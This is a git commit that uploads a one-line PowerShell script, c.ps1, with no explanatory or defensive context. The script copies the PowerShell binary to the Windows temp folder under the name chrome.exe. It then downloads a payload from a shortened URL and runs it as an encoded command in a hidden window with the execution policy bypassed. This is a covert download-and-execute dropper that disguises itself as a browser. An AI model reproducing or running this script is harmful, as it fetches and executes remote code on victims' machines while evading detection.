3d93365c11a19fc4eb9b015f2988e2bc438f31ac
bonuxT1 <39551631+bonuxT1@users.noreply.github.com>
2018-06-15 17:34:25 +0200

    Add files via upload

---
+++ c.ps1
@@ -0,0 +1,1 @@
+$f="c:\windows\temp\chrome.exe"; copy (Get-Process powershell | select -First 1).Path -Dest $f; $e=(New-Object System.Net.WebClient).DownloadString(\"http://v.ht/RI3n\"); c:\windows\temp\chrome.exe -w hidden -Exec bypass -e $e
